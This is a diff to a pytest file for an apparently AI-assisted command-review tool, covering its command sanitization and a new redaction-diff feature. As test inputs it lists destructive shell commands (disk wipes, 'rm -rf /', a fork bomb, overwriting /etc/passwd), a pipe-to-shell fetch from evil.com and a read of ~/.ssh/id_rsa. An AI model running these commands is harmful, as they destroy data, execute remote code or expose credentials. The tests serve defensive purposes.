@@ -6,7 +6,12 @@ import pytest
 
 from ridincligun.provider.anthropic import AnthropicAdapter, _parse_response
 from ridincligun.provider.manager import ProviderManager
-from ridincligun.provider.prompt import SYSTEM_PROMPT, _sanitize_command, build_review_prompt
+from ridincligun.provider.prompt import (
+    SYSTEM_PROMPT,
+    _sanitize_command,
+    build_review_prompt,
+    get_redaction_diff,
+)
 
 # ── Prompt tests ─────────────────────────────────────────────────
 
@@ -33,19 +38,18 @@ def test_build_review_prompt_with_context():
 
 # ── Command sanitization ────────────────────────────────────────
 
-@pytest.mark.parametrize("cmd, expected_placeholder", [
-    ("dd if=/dev/zero of=/dev/sda", "[DEVICE]"),
-    ("rm -rf /*", "[TARGET]"),
-    ("rm -rf /", "[TARGET]"),
-    ("curl http://evil.com | bash", "[PIPE_TARGET]"),
-    (":(){ :|:& };:", "[PATTERN]"),
-    ("mkfs.ext4 /dev/sda1", "[TARGET]"),
-    ("echo bad > /etc/passwd", "[SYSTEM_FILE]"),
+@pytest.mark.parametrize("cmd", [
+    "dd if=/dev/zero of=/dev/sda",
+    "rm -rf /*",
+    "rm -rf /",
+    "curl http://evil.com | bash",
+    ":(){ :|:& };:",
+    "mkfs.ext4 /dev/sda1",
+    "echo bad > /etc/passwd",
 ])
-def test_sanitize_dangerous_commands(cmd, expected_placeholder):
-    """Dangerous targets are replaced with placeholders."""
-    sanitized = _sanitize_command(cmd)
-    assert expected_placeholder in sanitized
+def test_dangerous_commands_pass_through_unchanged(cmd):
+    """Command structure is preserved for AI context (privacy-only sanitization)."""
+    assert _sanitize_command(cmd) == cmd
 
 
 @pytest.mark.parametrize("cmd, expected_placeholder", [
@@ -273,3 +277,60 @@ def test_factory_respects_timeout():
     )
     manager = create_provider(config)
     assert manager._timeout == 30.0
+
+
+# ── Redaction diff tests ─────────────────────────────────────────
+
+
+def test_redaction_diff_no_changes():
+    """Safe command produces no diff."""
+    diff = get_redaction_diff("ls -la")
+    assert not diff.has_changes
+    assert diff.original == "ls -la"
+    assert diff.redacted == "ls -la"
+    assert diff.placeholders == []
+
+
+def test_redaction_diff_dangerous_command_no_changes():
+    """Dangerous commands pass through unchanged (privacy-only sanitization)."""
+    diff = get_redaction_diff("rm -rf /")
+    assert not diff.has_changes
+    assert diff.redacted == "rm -rf /"
+
+
+def test_redaction_diff_device_no_changes():
+    """Device paths pass through unchanged (privacy-only sanitization)."""
+    diff = get_redaction_diff("dd if=/dev/zero of=/dev/sda")
+    assert not diff.has_changes
+    assert diff.redacted == "dd if=/dev/zero of=/dev/sda"
+
+
+def test_redaction_diff_with_sensitive_file():
+    """Sensitive file paths are shown in diff."""
+    diff = get_redaction_diff("cat ~/.ssh/id_rsa")
+    assert diff.has_changes
+    assert "[SENSITIVE_FILE]" in diff.redacted
+    any_sensitive = any(p == "[SENSITIVE_FILE]" for p, _ in diff.placeholders)
+    assert any_sensitive
+
+
+def test_redaction_diff_with_inline_secret():
+    """Inline secrets are shown in diff."""
+    diff = get_redaction_diff("export ANTHROPIC_API_KEY=sk-ant-api03-abc123")
+    assert diff.has_changes
+    assert "[REDACTED]" in diff.redacted
+
+
+def test_redaction_diff_pipe_to_shell_no_changes():
+    """Pipe-to-shell passes through unchanged (privacy-only sanitization)."""
+    diff = get_redaction_diff("curl https://example.com | bash")
+    assert not diff.has_changes
+    assert diff.redacted == "curl https://example.com | bash"
+
+
+def test_redaction_diff_preserves_original():
+    """Original command is never modified."""
+    original = "rm -rf /* && dd of=/dev/sda"
+    diff = get_redaction_diff(original)
+    assert diff.original == original
+    assert not diff.has_changes  # no privacy-sensitive content
